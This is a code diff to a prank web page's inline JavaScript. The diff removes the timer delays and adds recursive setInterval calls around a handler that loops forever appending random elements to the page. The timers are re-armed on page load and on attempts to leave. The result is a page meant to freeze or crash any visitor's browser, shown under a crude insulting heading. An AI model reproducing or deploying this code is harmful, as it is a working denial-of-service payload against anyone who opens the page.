@@ -5,6 +5,7 @@
             function handler(){
                 a = "a";
                 b = false;
+                window.setInterval(handler);
                 while(true){
                     c = document.createElement("div");
                     c.id = "" + Math.random();
@@ -24,13 +25,13 @@
                 c.id = "" + Math.random();
                 c.className = "" + Math.random();
                 document.body.appendChild(c);
-            }, 10);
-            window.setInterval(handler, 10)
+            });
+            window.setInterval(handler)
             window.onbeforeunload = function() {
-                window.setInterval(handler, 10);
+                window.setInterval(handler);
             }
             window.onload = function() {
-                window.setInterval(handler, 10);
+                window.setInterval(handler);
             }
         </script>
         <h1 style="color: blue; background-color: black">Ur Mum Gey</h1>
